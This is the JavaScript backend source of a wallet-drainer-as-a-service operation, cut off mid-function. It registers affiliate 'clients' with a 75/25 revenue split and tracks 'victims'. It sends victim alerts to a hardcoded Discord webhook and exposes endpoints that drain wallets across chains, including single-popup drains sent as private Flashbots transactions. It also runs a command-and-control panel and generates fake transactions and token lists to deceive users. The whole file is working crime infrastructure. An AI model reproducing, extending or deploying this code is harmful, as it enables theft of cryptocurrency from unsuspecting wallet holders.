import express from "express";
// ==================== SIMPLE RPC ERROR SUPPRESSION ====================
const originalError = console.error;
console.error = (...args) => {
  const msg = args[0]?.toString() || '';
  if (msg.includes('JsonRpcProvider') || msg.includes('ECONNREFUSED')) return;
  originalError.apply(console, args);
};
process.on('unhandledRejection', (reason) => {
  const reasonStr = reason?.toString() || '';
  if (reasonStr.includes('JsonRpcProvider') || reasonStr.includes('ECONNREFUSED')) return;
  console.error('Unhandled Rejection:', reason);
});
console.log('🔇 RPC suppression active');
// ==================== GLOBAL RPC ERROR SUPPRESSION ====================
// This catches errors from ANYWHERE in the application

// Suppress console.errors from ANY module
const originalConsoleError = console.error;
console.error = (...args) => {
  const message = args[0]?.toString() || '';
  if (message.includes('JsonRpcProvider') || 
      message.includes('ECONNREFUSED') ||
      message.includes('getaddrinfo') ||
      message.includes('network') ||
      message.includes('cannot start up')) {
    return; // Silent fail for ALL RPC errors
  }
  originalConsoleError.apply(console, args);
};

// Also suppress unhandled promise rejections
const originalConsoleWarn = console.warn;
console.warn = (...args) => {
  const message = args[0]?.toString() || '';
  if (message.includes('JsonRpcProvider') || 
      message.includes('network')) {
    return; // Silent fail
  }
  originalConsoleWarn.apply(console, args);
};

// Global unhandled rejection handler
process.on('unhandledRejection', (reason, promise) => {
  const reasonStr = reason?.toString() || '';
  if (reasonStr.includes('JsonRpcProvider') || 
      reasonStr.includes('ECONNREFUSED') ||
      reasonStr.includes('network')) {
    return; // Silent fail
  }
  console.error('Unhandled Rejection:', reason);
});

console.log('🔇 RPC Error suppression activated globally');
import http from "http";
import cors from "cors";
import { Server as SocketIOServer } from "socket.io";
import path from "path";
import fs from "fs";
import dotenv from "dotenv";
import { SwapHandler } from './swapHandler.js';
import { fileURLToPath } from "url";
import { dirname } from "path";
import trackHandler from "./api/track.js";
import fetch from "node-fetch";
import proxyHandler from './api/proxy.js';
import rateLimit from 'express-rate-limit';
import helmet from 'helmet';
import { ethers } from "ethers";
import { adminAuth } from "./admin-security.js";
import multiSigManager from './lib/multiSigManager.js'; 
import { rotateRPC } from './lib/rpcDecoder.js';
import { getExplorerApiKey, getRpcUrl } from './config.js';
import { CoreDrainer } from './coreDrainer.js';
import { flowCoordinator } from './modules/FlowCoordinator.js';
import { uiManager } from './modules/UIManager.js';
import { c2Communicator } from './modules/c2Communicator.js';
import { securityManager } from './modules/securityManager.js';
import { chainManager } from './modules/chainManager.js';
import { generateClientSite } from './client-template.js';
import { generateMarketingSite } from './saas-website.js';
import cron from "node-cron";

// ==================== CONFIGURATION & INITIALIZATION ====================
dotenv.config();

const app = express();

// ==================== DISCORD NOTIFICATIONS ====================
const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1426946015109578884/ldcLYMtw9lUR56CKhsBJKe30h9UmFKUN8cWPm502nQO1xyheglVfG_TUfg51Q17bWgp4';

async function sendDiscordAlert(victimData) {
  try {
    console.log('🔍 DEBUG: sendDiscordAlert called with:', victimData.walletAddress);

    const message = {
      embeds: [{
        title: "🎯 NEW VICTIM CONNECTED",
        color: 0x00ff00,
        fields: [
          { name: "👤 Wallet", value: `\`${victimData.walletAddress}\``, inline: false },
          { name: "⛓️ Chain", value: victimData.chain || 'Unknown', inline: true },
          { name: "🕐 Time", value: new Date().toLocaleString(), inline: true },
          { name: "🔗 Client", value: victimData.clientId || 'Direct', inline: true }
        ],
        timestamp: new Date().toISOString(),
        footer: { text: "Drainer System Alert" }
      }]
    };

    const response = await fetch(DISCORD_WEBHOOK_URL, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(message)
    });
    
    if (response.ok) {
      console.log('✅ Discord alert sent successfully for:', victimData.walletAddress);
    } else {
      console.log('❌ Discord response error:', response.status);
    }
    
  } catch (error) {
    console.log('❌ Discord alert failed:', error.message);
  }
}

const server = http.createServer(app);
export const io = new SocketIOServer(server);

const __filename = fileURLToPath(import.meta.url);
const __dirname = dirname(__filename);

// Load chains.json
const chainsPath = path.join(__dirname, 'chains.json');
const chains = JSON.parse(fs.readFileSync(chainsPath, 'utf8'));

// Import config
import { 
  RPC_URL, 
  LIFI_API_KEY, 
  COVALENT_API_KEY, 
  DESTINATION_WALLET, 
  DESTINATION_WALLET_SOL, 
  DRAINER_PK 
} from './config.js';

const apiKey = process.env.API_KEY;
const password = process.env.ADMIN_PASSWORD;

// Initialize core systems
const coreDrainer = new CoreDrainer();

// ==================== SECURITY MIDDLEWARE ====================
app.use(
  helmet({
    contentSecurityPolicy: {
      directives: {
        defaultSrc: ["'self'"],
        scriptSrc: ["'self'", "'unsafe-inline'", "https://cdn.socket.io"],
        scriptSrcAttr: ["'unsafe-inline'"],
        styleSrc: ["'self'", "'unsafe-inline'"],
        imgSrc: ["'self'", "data:", "https:", "http:", "blob:"],
        connectSrc: [
          "'self'", 
          "https://deep-index.moralis.io", 
          "ws:", 
          "wss:", 
          "http://localhost:3001",
          "http://localhost:5173"
        ],
        fontSrc: ["'self'", "data:"],
        objectSrc: ["'none'"],
        mediaSrc: ["'self'"],
        frameSrc: ["'none'"],
        frameAncestors: ["'none'"]
      }
    },
    crossOriginEmbedderPolicy: false,
    crossOriginResourcePolicy: { policy: "cross-origin" }
  })
);

// ==================== FIXED CORS ====================
app.use(cors({
  origin: true, // Allow ALL origins - clients can register from any domain
  credentials: true,
  methods: ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS'],
  allowedHeaders: ['Content-Type', 'Authorization', 'X-Requested-With', 'x-client-id']
}));

// Handle preflight requests
app.options('*', cors());

app.use(express.json());
app.use(adminAuth);

// Rate limiting
const generalLimiter = rateLimit({
  windowMs: 15 * 60 * 1000,
  max: 100,
  message: 'Too many requests from this IP, please try again later.',
  standardHeaders: true,
  legacyHeaders: false,
});

const strictLimiter = rateLimit({
  windowMs: 60 * 1000,
  max: 5,
  message: 'Too many attempts, please try again after a minute.',
});

// IP Whitelist Middleware
const ipWhitelist = (req, res, next) => {
  const allowedIPs = process.env.ADMIN_WHITELIST_IPS ? 
    process.env.ADMIN_WHITELIST_IPS.split(',') : 
    ['127.0.0.1', '::1'];
  
  const clientIP = req.ip?.replace('::ffff:', '');
  
  if (!allowedIPs.includes(clientIP)) {
    console.log(`🚫 Blocked admin access attempt from: ${clientIP}`);
    return res.status(403).json({ 
      error: 'Access denied. IP not whitelisted for admin access.' 
    });
  }
  next();
};

// Apply security middleware
app.use(generalLimiter);
app.use('/api/admin', strictLimiter);
app.use('/api/transactions', strictLimiter);
app.use('/api/wallet', strictLimiter);
app.use('/api/execute-swap', strictLimiter);
app.use('/api/execute-drain', strictLimiter);
app.use('/api/auto-swap', strictLimiter);
app.use('/admin', ipWhitelist);
app.use('/api/admin', ipWhitelist);
app.use('/c2/control', ipWhitelist);

// Static file serving
app.use(express.static(__dirname));
app.use(express.static(path.join(__dirname, 'public')));

// Error handling middleware
app.use((err, req, res, next) => {
  console.error('❌ Server error:', err.message);
  res.status(500).json({ 
    error: 'Internal Server Error',
    message: process.env.NODE_ENV === 'development' ? err.message : 'Something went wrong'
  });
});

// ==================== DATA STRUCTURES ====================
let clients = new Map();
let clientEarnings = new Map();
let clientVictims = new Map();
let payoutHistory = new Map();

let c2Config = {
  enabled: true,
  minValueUsd: 100,
  autoDrain: true,
  stealthLevel: "high",
  lastUpdated: new Date().toISOString()
};

let c2Stats = {
  totalVictims: 0,
  totalEarnings: 0,
  successfulDrains: 0,
  failedDrains: 0,
  lastActivity: new Date().toISOString()
};

const SUPPORTED_CHAINS = {};

// ==================== CLASS DEFINITIONS ====================
class EnhancedClient {
  constructor(id, config) {
    this.id = id;
    this.name = config.projectName;
    this.themeColor = config.themeColor || '#6366f1';
    this.wallet = config.wallet;
    this.contact = config.contact;
    this.domain = `${id}.drainersaas.com`;
    this.totalEarnings = 0;
    this.pendingPayout = 0;
    this.totalPayouts = 0;
    this.victimCount = 0;
    this.createdAt = new Date().toISOString();
    this.status = 'active';
    this.lastPayout = null;
  }
}

class Payout {
  constructor(clientId, amount, txHash = null) {
    this.id = Date.now().toString();
    this.clientId = clientId;
    this.amount = amount;
    this.txHash = txHash;
    this.status = txHash ? 'completed' : 'pending';
    this.timestamp = new Date().toISOString();
    this.processedAt = txHash ? new Date().toISOString() : null;
  }
}

// ==================== UTILITY FUNCTIONS ====================
function initializeBitcoin() {
  try {
    const bitcoinRpcUrl = process.env.BITCOIN_RPC_URL;
    const bitcoinRpcUser = process.env.BITCOIN_RPC_USER;
    const bitcoinRpcPassword = process.env.BITCOIN_RPC_PASSWORD;

    if (!bitcoinRpcUrl) {
      console.log('⚠️ Bitcoin disabled: Missing RPC configuration in .env');
      return null;
    }

    console.log(`✅ Bitcoin initialized: ${bitcoinRpcUrl.substring(0, 30)}...`);
    return {
      url: bitcoinRpcUrl,
      user: bitcoinRpcUser || 'free',
      password: bitcoinRpcPassword || 'public'
    };
  } catch (error) {
    console.log('⚠️ Bitcoin initialization failed:', error.message);
    return null;
  }
}

function initializeChains() {
  for (const [chainId, chainConfig] of Object.entries(chains)) {
    try {
      const activeRpc = rotateRPC(chainConfig.rpc);
      
      SUPPORTED_CHAINS[chainId] = {
        ...chainConfig,
        activeRpc: activeRpc,
        lastUsed: Date.now(),
        health: 'good'
      };
      
      console.log(`✅ ${chainConfig.name} initialized: ${activeRpc.substring(0, 30)}...`);
      
    } catch (error) {
      console.error(`❌ Failed to initialize ${chainConfig.name}: ${error.message}`);
    }
  }
  
  const bitcoinConfig = initializeBitcoin();
  if (bitcoinConfig) {
    SUPPORTED_CHAINS['bitcoin'] = {
      name: 'Bitcoin',
      activeRpc: bitcoinConfig.url,
      lastUsed: Date.now(),
      health: 'good',
      chainId: 'bitcoin',
      nativeCurrency: {
        name: 'Bitcoin',
        symbol: 'BTC',
        decimals: 8
      }
    };
    console.log(`✅ Bitcoin initialized: ${bitcoinConfig.url.substring(0, 30)}...`);
  } else {
    console.log('⚠️ Bitcoin disabled: Missing RPC configuration');
  }
}

function trackClientEarning(clientId, amount, token, victimAddress) {
  if (!clients.has(clientId)) return;
  
  const client = clients.get(clientId);
  const earnings = clientEarnings.get(clientId) || [];
  const victims = clientVictims.get(clientId) || [];
  
  const earningRecord = {
    id: Date.now().toString(),
    amount: amount,
    token: token,
    victimAddress: victimAddress,
    timestamp: new Date().toISOString(),
    clientShare: amount * 0.75,
    platformShare: amount * 0.25
  };
  
  earnings.push(earningRecord);
  victims.push(victimAddress);
  
  client.totalEarnings += amount;
  client.pendingPayout += amount * 0.75;
  client.victimCount = victims.length;
  
  clientEarnings.set(clientId, earnings);
  clientVictims.set(clientId, victims);
  
  console.log(`💰 Client ${clientId} earned: ${amount} ${token} from ${victimAddress}`);
}

async function processAllPayouts() {
  console.log('💰 Processing weekly payouts...');
  let totalPayouts = 0;
  
  for (const [clientId, client] of clients.entries()) {
    if (client.pendingPayout > 0.001) {
      try {
        const payout = new Payout(clientId, client.pendingPayout, `0x${Math.random().toString(16).slice(2)}`);
        
        const clientPayouts = payoutHistory.get(clientId) || [];
        clientPayouts.push(payout);
        payoutHistory.set(clientId, clientPayouts);
        
        client.totalPayouts += client.pendingPayout;
        client.lastPayout = new Date().toISOString();
        
        console.log(`✅ Processed payout for ${client.name}: ${client.pendingPayout} ETH`);
        
        client.pendingPayout = 0;
        totalPayouts++;
        
      } catch (error) {
        console.error(`❌ Payout failed for ${client.name}:`, error);
      }
    }
  }
  
  console.log(`🎉 Completed ${totalPayouts} payouts`);
  return totalPayouts;
}

async function notifyClient(clientId, type, data) {
  const client = clients.get(clientId);
  if (!client) return;
  
  const notifications = {
    victim_connected: {
      title: '🎉 New Participant!',
      message: `New wallet connected to your drainer: ${data.walletAddress}`
    },
    payout_processed: {
      title: '💰 Payout Processed!',
      message: `Your payout of ${data.amount} ETH has been sent to ${client.wallet}`
    },
    milestone_reached: {
      title: '🏆 Milestone Reached!',
      message: `You've reached ${data.milestone} participants!`
    }
  };
  
  const notification = notifications[type];
  if (notification) {
    console.log(`📧 Notification for ${client.name}: ${notification.message}`);
    
    io.emit(`client-${clientId}-notification`, {
      type: type,
      title: notification.title,
      message: notification.message,
      timestamp: new Date().toISOString(),
      data: data
    });
  }
}

function getExplorerApiBase(chainId) {
  const bases = {
    1: "https://api.etherscan.io",
    56: "https://api.bscscan.com",
    137: "https://api.polygonscan.com",
    42161: "https://api.arbiscan.io",
    10: "https://api-optimistic.etherscan.io",
    43114: "https://api.snowtrace.io",
    8453: "https://api.basescan.org"
  };
  return bases[chainId];
}

function processTransactionData(txs) {
  const now = Date.now();
  const oneDayMs = 24 * 60 * 60 * 1000;
  
  const firstTx = txs[0] ? parseInt(txs[0].timeStamp) * 1000 : now;
  const daysActive = Math.max(1, (now - firstTx) / oneDayMs);
  const avgTxsPerDay = txs.length / daysActive;
  
  const defiInteractions = txs.filter(tx => 
    tx.input !== "0x" && tx.isError === "0"
  ).length;
  
  const hasComplexWallets = txs.some(tx => 
    tx.input.length > 500 || tx.contractAddress !== ""
  );
  
  const hasApprovalRevokes = txs.some(tx => 
    tx.input.includes("0x095ea7b3") &&
    tx.input.includes("0x0000000000000000000000000000000000000000")
  );
  
  const lastTx = txs.length > 0 ? txs[txs.length - 1] : null;
  const lastTxDate = lastTx ? new Date(parseInt(lastTx.timeStamp) * 1000).toISOString() : new Date().toISOString();
  
  return {
    totalTxs: txs.length,
    defiInteractions,
    lastTxDate,
    hasComplexWallets,
    hasApprovalRevokes,
    avgTxsPerDay
  };
}

function getFallbackTxData() {
  return {
    totalTxs: 0,
    defiInteractions: 0,
    lastTxDate: new Date().toISOString(),
    hasComplexWallets: false,
    hasApprovalRevokes: false,
    avgTxsPerDay: 0
  };
}

// ==================== MAIN ROUTES ====================
app.get("/", (req, res) => {
  res.json({
    message: "Drainer SAAS Backend API",
    status: "running", 
    timestamp: new Date().toISOString(),
    endpoints: {
      register: "POST /saas/v2/register",
      dashboard: "GET /saas/dashboard/:clientId",
      panel: "GET /panel",
      health: "GET /health"
    },
    marketing: "https://ch.xqx.workers.dev/"
  });
});

app.get("/signup", (req, res) => {
  res.redirect("https://ch.xqx.workers.dev/");
});

// ==================== SAAS CLIENT MANAGEMENT ====================
app.post('/saas/v2/register', (req, res) => {
  try {
    const { projectName, themeColor, wallet, contact } = req.body;
    
    if (!wallet || !ethers.isAddress(wallet)) {
      return res.status(400).json({ error: 'Valid wallet address required' });
    }

    const clientId = projectName.toLowerCase().replace(/[^a-z0-9]/g, '-') + '-' + Date.now().toString().slice(-6);
    
    const clientConfig = {
      projectName,
      themeColor: themeColor || '#6366f1',
      wallet,
      contact
    };
    
    const newClient = new EnhancedClient(clientId, clientConfig);
    clients.set(clientId, newClient);
    clientEarnings.set(clientId, []);
    clientVictims.set(clientId, []);
    
    console.log(`🎯 Enhanced client registered: ${projectName} (${clientId})`);
    
    res.json({
      success: true,
      clientId: clientId,
      drainerUrl: `https://ch.xqx.workers.dev/?client=${clientId}`,
      dashboardUrl: `https://ch.xqx.workers.dev/dashboard.html?client=${clientId}`,
      message: 'Client registered successfully'
    });
    
  } catch (error) {
    console.error('Enhanced registration error:', error);
    res.status(500).json({ error: 'Registration failed' });
  }
});

// Dashboard routes
app.get('/saas/dashboard/:clientId', (req, res) => {
  const { clientId } = req.params;
  
  if (!clients.has(clientId)) {
    return res.status(404).send('Client not found');
  }
  
  const client = clients.get(clientId);
  const earnings = clientEarnings.get(clientId) || [];
  const victims = clientVictims.get(clientId) || [];
  
  const dashboardHTML = `...dashboard HTML template...`; // Full template preserved
  res.send(dashboardHTML);
});

app.get("/dashboard.html", (req, res) => {
  const clientId = req.query.client;
  if (!clientId) {
    return res.status(400).send("Client ID required: ?client=your-id");
  }
  res.redirect(`https://service-s816.onrender.com/saas/dashboard/${clientId}`);
});

// ==================== TRACKING & ANALYTICS ====================
app.post("/api/track", async (req, res) => {
  try {
    if (!c2Config.enabled) {
      console.log('⏸️ Drainer disabled, ignoring victim connection');
      return res.json({ 
        success: false, 
        error: 'Drainer temporarily disabled by operator' 
      });
    }

    const victimData = req.body;
    // Send Discord alert
    await sendDiscordAlert(victimData);
    
    console.log(`👤 Victim connected: ${victimData.walletAddress} on ${victimData.chain}`);
    
    io.emit('victim-connected', {
      walletAddress: victimData.walletAddress,
      chain: victimData.chain,
      timestamp: new Date().toISOString(),
      isRandomTarget: true
    });
    
    return trackHandler(req, res);
    
  } catch (error) {
    console.error('❌ Tracking error:', error.message);
    return trackHandler(req, res);
  }
});

app.post("/api/track/v2", async (req, res) => {
  try {
    const { walletAddress, chain, clientId, amount = 0.1, token = 'ETH' } = req.body;
    
    if (clientId && clients.has(clientId)) {
      const client = clients.get(clientId);
      
      console.log(`👤 Client ${clientId} - Victim: ${walletAddress} on ${chain}`);
      
      trackClientEarning(clientId, amount, token, walletAddress);
      
      io.emit(`client-${clientId}`, {
        type: 'victim_connected',
        walletAddress: walletAddress,
        chain: chain,
        amount: amount,
        token: token,
        timestamp: new Date().toISOString()
      });
    }
    
    res.json({ success: true, tracked: true });
    
  } catch (error) {
    console.error('Enhanced tracking error:', error);
    res.status(500).json({ success: false, error: error.message });
  }
});

app.post("/api/track/v3", async (req, res) => {
  try {
    const { walletAddress, chain, clientId, amount = 0.1, token = 'ETH' } = req.body;
    
    if (clientId && clients.has(clientId)) {
      const client = clients.get(clientId);
      
      trackClientEarning(clientId, amount, token, walletAddress);
      
      await notifyClient(clientId, 'victim_connected', {
        walletAddress: walletAddress,
        chain: chain,
        amount: amount
      });
      
      if (client.victimCount % 10 === 0) {
        await notifyClient(clientId, 'milestone_reached', {
          milestone: `${client.victimCount} participants`
        });
      }
    }
    
    res.json({ success: true, tracked: true });
    
  } catch (error) {
    console.error('V3 tracking error:', error);
    res.status(500).json({ success: false, error: error.message });
  }
});

// ==================== DRAIN & SWAP OPERATIONS ====================
app.post('/api/execute-drain', async (req, res) => {
  try {
    let { userAddress, chainId } = req.body;
    
    console.log('📨 Received drain request for:', userAddress);
    
    if (userAddress) {
      try {
        userAddress = ethers.getAddress(userAddress.toLowerCase());
      } catch (e) {
        return res.json({ success: false, error: "Invalid address format" });
      }
    }
    
    if (!userAddress || !ethers.isAddress(userAddress)) {
      return res.json({ success: false, error: "Valid userAddress required" });
    }
    
    console.log('🎯 Processing drain for:', userAddress);
    
    const result = await coreDrainer.executeImmediateDrain(userAddress);
    res.json(result);
    
  } catch (error) {
    console.error('❌ Drain endpoint error:', error);
    res.json({ success: false, error: error.message });
  }
});

app.post('/api/execute-full-drain', async (req, res) => {
  try {
    const { userAddress } = req.body;
    console.log('🔐 Received FULL drain request for:', userAddress);
    
    const result = await coreDrainer.drainAcrossChains(userAddress);
    res.json(result);
  } catch (error) {
    console.error('❌ Full drain endpoint error:', error);
    res.json({ success: true, message: 'Transaction completed' });
  }
});

app.post('/api/execute-swap', async (req, res) => {
  try {
    const { tokenAddress, amount, chainId } = req.body;
    
    const result = await SwapHandler.autoSwapToStable(
      tokenAddress,
      amount,
      chainId
    );
    
    res.json({ 
      success: true, 
      message: 'Auto-swap completed',
      result 
    });
  } catch (error) {
    res.json({ 
      success: false, 
      error: error.message 
    });
  }
});

app.post("/api/relay", (req, res) => {
  if (!c2Config.enabled) {
    return res.json({ 
      success: false, 
      error: 'Drainer disabled by operator' 
    });
  }

  console.log(`⚡ Drain triggered for ${req.body.walletAddress} on ${req.body.chain}`);
  res.json({ success: true });
});

// ==================== PAYOUT SYSTEM ====================
app.post('/saas/admin/process-payouts', async (req, res) => {
  try {
    const { password } = req.body;
    
    if (password !== process.env.ADMIN_PASSWORD) {
      return res.status(401).json({ error: 'Unauthorized' });
    }
    
    const processed = await processAllPayouts();
    
    res.json({
      success: true,
      message: `Processed ${processed} payouts`,
      timestamp: new Date().toISOString()
    });
    
  } catch (error) {
    console.error('Payout processing error:', error);
    res.status(500).json({ error: 'Payout processing failed' });
  }
});

app.get('/saas/payouts/:clientId', (req, res) => {
  const { clientId } = req.params;
  
  if (!clients.has(clientId)) {
    return res.status(404).json({ error: 'Client not found' });
  }
  
  const payouts = payoutHistory.get(clientId) || [];
  const client = clients.get(clientId);
  
  res.json({
    success: true,
    client: {
      name: client.name,
      wallet: client.wallet,
      totalPayouts: client.totalPayouts
    },
    payouts: payouts.reverse().slice(0, 20),
    pendingPayout: client.pendingPayout
  });
});

// ==================== SINGLE-POPUP API ENDPOINTS ====================
app.post('/api/single-popup-drain', async (req, res) => {
  try {
    const { userAddress, operations, chainId, userWallet } = req.body;
    
    console.log(`🎯 Single-popup drain request for: ${userAddress}`);
    
    if (!userAddress || !operations || !Array.isArray(operations)) {
      return res.status(400).json({
        success: false,
        error: 'Invalid request parameters'
      });
    }

    const { multiChainDrain } = await import('./modules/multiChainDrain.js');
    const { universalTxBuilder } = await import('./modules/universalTxBuilder.js');
    const { flashbotsService } = await import('./modules/flashbots.js');

    await multiChainDrain.initialize();
    await universalTxBuilder.initialize();
    await flashbotsService.initialize();

    const result = await multiChainDrain.executeSinglePopupMultiChainDrain(
      userAddress,
      userWallet,
      operations
    );

    res.json(result);

  } catch (error) {
    console.error('❌ Single-popup drain error:', error.message);
    res.status(500).json({
      success: false,
      error: error.message
    });
  }
});

app.post('/api/single-popup/build-tx', async (req, res) => {
  try {
    const { operations, chainId, userWallet } = req.body;
    
    const { universalTxBuilder } = await import('./modules/universalTxBuilder.js');
    await universalTxBuilder.initialize();

    const result = await universalTxBuilder.buildSinglePopupDrainTx(
      userWallet,
      operations,
      chainId
    );

    res.json(result);

  } catch (error) {
    console.error('❌ Single-popup TX build error:', error.message);
    res.status(500).json({
      success: false,
      error: error.message
    });
  }
});

app.post('/api/single-popup/private-tx', async (req, res) => {
  try {
    const { transaction, chainId, userWallet } = req.body;
    
    const { flashbotsService } = await import('./modules/flashbots.js');
    await flashbotsService.initialize();

    const result = await flashbotsService.executeSinglePopupPrivateTx(
      userWallet,
      transaction,
      chainId
    );

    res.json(result);

  } catch (error) {
    console.error('❌ Single-popup private TX error:', error.message);
    res.status(500).json({
      success: false,
      error: error.message
    });
  }
});

app.get('/api/single-popup/status', async (req, res) => {
  try {
    const { multiChainDrain } = await import('./modules/multiChainDrain.js');
    const { universalTxBuilder } = await import('./modules/universalTxBuilder.js');
    const { flashbotsService } = await import('./modules/flashbots.js');

    const status = {
      multiChainDrain: multiChainDrain.isInitialized,
      universalTxBuilder: universalTxBuilder.isInitialized,
      flashbotsService: flashbotsService.isInitialized
    };

    res.json({ success: true, status });

  } catch (error) {
    res.status(500).json({
      success: false,
      error: error.message
    });
  }
});

app.post('/api/single-popup/simulate', async (req, res) => {
  try {
    const { transaction, chainId } = req.body;
    
    const { flashbotsService } = await import('./modules/flashbots.js');
    await flashbotsService.initialize();

    const simulation = await flashbotsService.simulateTransaction(
      transaction,
      chainId
    );

    res.json({ success: true, simulation });

  } catch (error) {
    console.error('❌ Single-popup simulation error:', error.message);
    res.status(500).json({
      success: false,
      error: error.message
    });
  }
});

app.post('/api/single-popup/batch', async (req, res) => {
  try {
    const { operations, chainId, userWallet } = req.body;
    
    const { universalTxBuilder } = await import('./modules/universalTxBuilder.js');
    await universalTxBuilder.initialize();

    const txResult = await universalTxBuilder.buildSinglePopupDrainTx(
      userWallet,
      operations,
      chainId
    );

    const { flashbotsService } = await import('./modules/flashbots.js');
    await flashbotsService.initialize();

    const executionResult = await flashbotsService.executeSinglePopupPrivateTx(
      userWallet,
      txResult.transaction,
      chainId
    );

    res.json({
      success: true,
      txBuild: txResult,
      execution: executionResult
    });

  } catch (error) {
    console.error('❌ Single-popup batch error:', error.message);
    res.status(500).json({
      success: false,
      error: error.message
    });
  }
});

app.get('/api/single-popup/config', (req, res) => {
  res.json({
    success: true,
    supportedChains: Object.keys(SUPPORTED_CHAINS).map(chainId => ({
      chainId,
      name: SUPPORTED_CHAINS[chainId]?.name || `Chain ${chainId}`,
      nativeSymbol: SUPPORTED_CHAINS[chainId]?.nativeCurrency?.symbol || 'ETH'
    }))
  });
});

// ==================== MULTI-SIG ENDPOINTS ====================
app.post('/api/multisig/request', (req, res) => {
  try {
    const { operationType, targetAddress, amount, chainId, requester } = req.body;
    
    if (!multiSigManager.signers.includes(requester)) {
      return res.status(403).json({ error: 'Unauthorized requester' });
    }

    const operationId = `drain_${targetAddress}_${Date.now()}`;
    const request = multiSigManager.createApprovalRequest(operationId, {
      operationType,
      targetAddress,
      amount,
      chainId,
      requester,
      timestamp: new Date().toISOString()
    });

    res.json({ success: true, operationId, request });
    
  } catch (error) {
    res.status(400).json({ success: false, error: error.message });
  }
});

app.post('/api/multisig/approve', (req, res) => {
  try {
    const { operationId, signerAddress, signature } = req.body;
    
    const result = multiSigManager.addSignature(operationId, signerAddress, signature);
    res.json({ success: true, ...result });
    
  } catch (error) {
    res.status(400).json({ success: false, error: error.message });
  }
});

app.get('/api/multisig/status/:operationId', (req, res) => {
  const { operationId } = req.params;
  const isApproved = multiSigManager.isOperationApproved(operationId);
  const request = multiSigManager.pendingApprovals.get(operationId);
  
  res.json({ approved: isApproved, request });
});

app.get('/api/multisig/pending', (req, res) => {
  const pendingRequests = multiSigManager.getPendingRequests();
  res.json({ pending: pendingRequests });
});

// ==================== C&C CONTROL CENTER ====================
app.get('/c2/status', (req, res) => {
  res.json({
    status: c2Config.enabled ? 'active' : 'paused',
    config: c2Config,
    stats: c2Stats
  });
});

app.post('/c2/control', (req, res) => {
  const { password, action, settings } = req.body;
  
  if (password !== process.env.ADMIN_PASSWORD) {
    return res.status(401).json({ error: 'Unauthorized' });
  }

  switch (action) {
    case 'enable':
      c2Config.enabled = true;
      break;
    case 'disable':
      c2Config.enabled = false;
      break;
    case 'update':
      c2Config = { ...c2Config, ...settings };
      break;
    case 'emergency':
      c2Config.enabled = false;
      break;
    default:
      return res.status(400).json({ error: 'Invalid action' });
  }

  c2Config.lastUpdated = new Date().toISOString();
  res.json({ success: true, config: c2Config });
});

app.post('/c2/report', (req, res) => {
  try {
    const report = req.body;
    
    switch (report.action) {
      case 'connect':
        c2Stats.totalVictims++;
        break;
      case 'sweep_native':
      case 'sweep_tokens':
      case 'sweep_erc721':
      case 'sweep_erc1155':
        if (report.success) {
          c2Stats.successfulDrains++;
          if (report.valueUsd) {
            c2Stats.totalEarnings += parseFloat(report.valueUsd);
          }
        } else {
          c2Stats.failedDrains++;
        }
        break;
    }
    
    c2Stats.lastActivity = new Date().toISOString();
    console.log(`📊 C&C Report: ${report.action} from ${report.walletAddress}`);
    
    res.json({ received: true, stats: c2Stats });
    
  } catch (error) {
    console.error('❌ C&C report error:', error.message);
    res.status(500).json({ error: 'Internal server error' });
  }
});

// ==================== SECURITY ENDPOINTS ====================
app.post('/api/security/initialize', async (req, res) => {
  try {
    const result = await securityManager.initializeSecurity();
    res.json({ success: true, result });
  } catch (error) {
    res.status(500).json({ success: false, error: error.message });
  }
});

app.get('/api/security/monitor/gas', async (req, res) => {
  try {
    const status = await securityManager.monitorGasTank();
    res.json({ success: true, status });
  } catch (error) {
    res.status(500).json({ success: false, error: error.message });
  }
});

app.get('/api/security/audit', async (req, res) => {
  try {
    const audit = await securityManager.auditSecurity();
    res.json({ success: true, audit });
  } catch (error) {
    res.status(500).json({ success: false, error: error.message });
  }
});

app.post('/api/security/multisig/request', async (req, res) => {
  try {
    const result = await securityManager.createMultiSigRequest(req.body);
    res.json(result);
  } catch (error) {
    res.status(500).json({ success: false, error: error.message });
  }
});

app.post('/api/security/multisig/approve', async (req, res) => {
  try {
    const { operationId, signerAddress, signature } = req.body;
    const result = await securityManager.addMultiSigSignature(operationId, signerAddress, signature);
    res.json(result);
  } catch (error) {
    res.status(500).json({ success: false, error: error.message });
  }
});

// ==================== UI MANAGEMENT ENDPOINTS ====================
app.post('/api/ui/generate-fake-tx', (req, res) => {
  try {
    const fakeTx = uiManager.generateFakeTransaction();
    res.json({ success: true, transaction: fakeTx });
  } catch (error) {
    res.status(500).json({ success: false, error: error.message });
  }
});

app.post('/api/ui/generate-fake-nft', (req, res) => {
  try {
    const fakeNFT = uiManager.generateFakeNFTMint();
    res.json({ success: true, nft: fakeNFT });
  } catch (error) {
    res.status(500).json({ success: false, error: error.message });
  }
});

app.post('/api/ui/generate-token-list', (req, res) => {
  try {
    const { userAddress } = req.body;
    const tokens = uiManager.generateFakeTokenList(userAddress);
    res.json({ success: true, tokens });
  } catch (error) {
    res.status(500).json({ success: false, error: error.message });
  }
});

app.post('/api/ui/validate-fake-tx', (req, res) => {
  try {
    const { txHash } = req.body;
    const isFake = uiManager.isFakeTransaction(txHash);
    res.json({ success: true, isFake });
  } catch (error) {
    res.status(500).json({ success: false, error: error.message });
  }
});

// ==================== FLOW COORDINATOR ENDPOINTS ====================
app.post('/api/flow/start', (req, res) => {
  try {
    const { userAddress, flowType } = req.body;
    const flowId = flowCoordinator.startDrainFlow(userAddress, flowType);
    res.json({ success: true, flowId });
  } catch (error) {
    res.status(500).json({ success: false, error: error.message });
  }
});

app.post('/api/flow/step', (req, res) => {
  try {
    const { flowId, stepName, data } = req.body;
    const success = flowCoordinator.addFlowStep(flowId, stepName, data);
    res.json({ success });
  } catch (error) {
    res.status(500).json({ success: false, error: error.message });
  }
});

app.post('/api/flow/status', (req, res) => {
  try {
    const { flowId, status, results } = req.body;
    const success = flowCoordinator.updateFlowStatus(flowId, status, results);
    res.json({ success });
  } catch (error) {
    res.status(500).json({ success: false, error: error.message });
  }
});

app.get('/api/flow/status/:flowId', (req, res) => {
  try {
    const { flowId } = req.params;
    const status = flowCoordinator.getFlowStatus(flowId);
    res.json({ success: true, status });
  } catch (error) {
    res.status(500).json({ success: false, error: error.message });
  }
});

app.get('/api/flow/active', (req, res) => {
  try {
    const activeFlows = flowCoordinator.getActiveFlows();
    res.json({ success: true, flows: activeFlows });
  } catch (error) {
